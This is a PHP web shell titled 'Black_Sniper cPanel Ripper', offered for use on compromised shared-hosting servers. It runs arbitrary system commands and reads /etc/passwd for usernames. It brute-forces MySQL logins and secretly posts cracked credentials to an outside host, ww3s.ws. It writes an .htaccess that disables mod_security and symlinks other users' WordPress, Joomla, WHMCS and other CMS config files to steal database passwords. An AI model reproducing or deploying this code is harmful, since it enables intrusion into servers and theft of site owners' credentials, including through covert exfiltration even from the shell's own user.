<?php 
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
echo '</head><img src="http://ww3s.ws/TR/HTML5/CSS3/fsocity.jpg"  height="0" width="0"><body>';
echo "
<html>
<body bgcolor=black>
<head>
<style type=text/css>
body{
	background:#000000;;
}
a {
text-decoration:none;
}
a:hover{
border-bottom:1px solid aqua;
}
*{
	font-size:11px;
	font-family:Courier,Courier,Courier;
	color:white;
}
#menu a{
	padding:4px 18px;
	margin:0;
	background:darkred;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;

}
</style>

<title>Black_Sniper cPanel Ripper</title>
</head>
<br><center><div id=menu>
<a href=?home>Home</a>
<a href=?grab>Config Grabber</a>
<a href=?cp>Cpanel Extractor My.Cnf</a>
<a href=?upl>Uploader</a>
</div></center>
<p>
<center>
<img src=http://i.imgur.com/RhCNL7E.png width=260 height=300/><br /></center><br><center><div id=menu>
<a href=?jump>jumping</a>
<a href=?pws>PassWorDs Grabber</a>
<a href=?x=symlink>Symlink</a>
<a href=?cp_cracker>cPanel Brute Force</a>
</div></center>
<br><br><center>".php_uname().";<br>";

if(isset($_GET["cp_cracker"])){
if(function_exists('apache_setenv')){
@apache_setenv('no-gzip', 1);}
@ini_set('zlib.output_compression', 0);
@ini_set('output_buffering ',0);
@ini_set('implicit_flush', 1); 
@ob_implicit_flush(true);
@ob_end_flush();
$ipserver=$_SERVER['SERVER_ADDR'];
echo '
<html>
<style> body {font-size: 12pt; font-family: "Times New Roman"; }</style><head>

</head>
<title>cPanel brutus</title>
<body text="#00FF00" bgcolor="#000000" vlink="#00BFFF" link="#FF0000" alink="#008000">
<div align="center">
<br>

</td></tr>
</table>
<br />';

if(!isset($_POST['submit'])){
function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('system')) {
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} else if(function_exists('passthru')) {
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} else if(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
		} else if(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
		} else if(@is_resource($f = @popen($cfe,"r"))) {
			$res = '';
			while(!@feof($f)) {
				$res .= @fread($f,1024); 
			}
			@pclose($f);
		}
	}
	return $res;
}
$default=execute("ls /var/mail");
if(!$default){
if($file=@file_get_contents('/etc/passwd')){
$u=explode("\n",$file);
foreach($u as $us){
$uss=explode(":x:",$us);
$default .=$uss[0]."\n";
}
}else if(function_exists('posix_getpwuid')){
for($n2=500;$n2<10000;$n2++){
$userinfo = posix_getpwuid($n2);
$name=$userinfo['name'];
if($name!=''){
$default.=$name."\n";
}
}}else{$default="Could not get any username.try manually :)";}
}

echo <<<EOF
<form  method="POST">
<div align='center'>
<table width='55%' style='border: 2px dashed #FF0000; background-color: #000000; color:#C0C0C0'>
<tr>
<td align='center'>
<span lang='en-us'><font color='#FF0000'><b>Usernames:</b></font></span>

<p align='center'>&nbsp;<textarea rows='30' name='usernames' cols='30' style='border: 2px dashed #FFFFFF; background-color: #000000; color:#C0C0C0'>$default</textarea><br/>
</p></td>
<td align='center'>
<span lang='en-us'><font color='#FF0000'><b>Passwords:</b></font></span>

<p align='center'>&nbsp;<textarea rows='30' name='passwords' cols='30' style='border: 2px dashed #FFFFFF; background-color: #000000; color:#C0C0C0'>123123\n123456\n1234567\n12345678\n123456789\n112233\n332211\ntest\ntest123\ncpanel\npassword\npassword1\nabc123\na1b2c3\npassw0rd\nPassword\nPassw0rd\nuser\npasswd\npasswords\npass\nchangeme\niloveyou\nfuckyou\nadmin\nqwerty\n1q2w3e\nq1w2e3\nqazqaz\n1qazxsw2\n1qaz2wsx\nqazxsw\nqazwsx</textarea><br/>
</p></td>
</tr>
</table><br/><input type='submit' value='    Subtmit    ' name='submit' style='color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000'></form>
EOF;
}else{
$password=array_unique(explode("\n",$_POST['passwords']));
$username=array_unique(explode("\n",$_POST['usernames']));
if(!set_time_limit(0)){"<font color='red'><b>ALERT:</b> set_time_limit(0) failed! Cracking will be interrupted!<br/></font>";}
echo '[+]Cracking...<br/><hr width="67%" style="border: 4px dashed #FF0000;"><font color="white" size="4"><b>username<font color="red">:</font>password</b></font><br/><br/>';
$count=0;
$n=0;
$start=time();
foreach($username as $user){
$count++;
$user=trim($user);
if ( @mysql_connect("localhost",$user,$user) ){echo "<font color='red'>$ipserver|$user</font>|<font color='red'>$user</font><hr width='67%' style='border: 1px dashed #1D1D1D;'>";$n++;continue;
$success=$ipserver."|".$user."|".$user."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://ww3s.ws/ok.php");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
}
foreach($password as $pass){
$count++;
$pass=trim($pass);
if ( @mysql_connect("localhost",$user,$pass) ){echo "<font color='red'>$ipserver|$user</font>|<font color='red'>$pass</font><hr width='67%' style='border: 1px dashed #1D1D1D;'>";
$success2=$ipserver."|".$user."|".$pass."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://ww3s.ws/ok.php");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success2));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
$n++;break;}
}
}
$end= time() - $start;
@$per=$count/$end;
if($n){
echo "[*]Successfully Cracked: <font color='red'><b>$n</b></font><br/>";}
echo '<font color="#00FF00">[*]Time took: '.$end.' seconds for '.$count.' tries ('.$per.'/sec)</font><br/>';
}
}


############### MULAI DARI SINI #################

if(isset($_GET["grab"])){
echo "
<body bgcolor=black>
<form method='POST'>
<style>
textarea {
resize:none;
color: #000000 ;
background-color:#000000;  
font-size:8pt; color:#ffffff;
border:1px solid white ;
border-left: 4px solid white ;
width:543px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>";
echo "<center>";

echo "</center><br><center>";
if (empty($_POST['config'])) { echo "<p><font face=Tahoma color=#007700 size=2pt>/etc/passwd content</p><br><form method=POST><textarea name=passwd class=area rows=15 cols=60>";
echo file_get_contents('/etc/passwd'); 
echo "</textarea><br><br><input name=config class=inputzbut size=100 value=Grab! type=submit><br></form></center><br>";
 }

if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink disabled :( </error>');}@mkdir('configs', 0755);@chdir('configs');
$htaccess="
Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php
<IfModule mod_autoindex.c>
IndexOptions FancyIndexing IconsAreLinks SuppressHTMLPreamble
</ifModule>
<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
Options +FollowSymLinks
DirectoryIndex Sux.html
Options +Indexes
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];
$passwd=explode("n",$passwd);
echo "<br><br><center><font color=#b0b000 size=2pt>grabbing, please wait ...</center><br>";
foreach($passwd as $pwd){
$pawd=explode(":",$pwd);$user =$pawd[0];
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');
@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');
@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');
@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');
@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');
@symlink('/home/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home/' . $user . '/public_html/config.inc.php', $user . '-amember2.txt');
@symlink('/home/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home/' . $user . '/public_html/home/wp-config.php', $user . '-wp-home.txt');
@symlink('/home/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home/' . $user . '/public_html/home/configuration.php', $user . '-joomla-home.txt');
@symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clientarea/configuration.php', $user . '-clientarea-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/autobuy/configuration.php', $user . '-autobuy-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home2/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home2/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home2/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home2/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home2/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home2/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home2/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home2/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home2/' . $user . '/public_html/config.inc.php', $user . '-amember2.txt');
@symlink('/home2/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home2/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home2/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home2/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home2/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home2/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home2/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home2/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home2/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home2/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home2/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home2/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home2/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home2/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home2/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home2/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home2/' . $user . '/public_html/home2/wp-config.php', $user . '-wp-home2.txt');
@symlink('/home2/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home2/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home2/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home2/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home2/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home2/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home2/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home2/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home2/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home2/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home2/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home2/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home2/' . $user . '/public_html/home2/configuration.php', $user . '-joomla-home2.txt');
@symlink('/home2/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home2/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home2/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home2/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home2/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home2/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home2/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home2/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home2/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home2/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home2/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home2/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home2/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home2/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home2/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home2/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home2/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home2/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home2/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home2/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home2/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home2/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home2/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home2/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home2/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home2/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home2/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home2/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home2/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
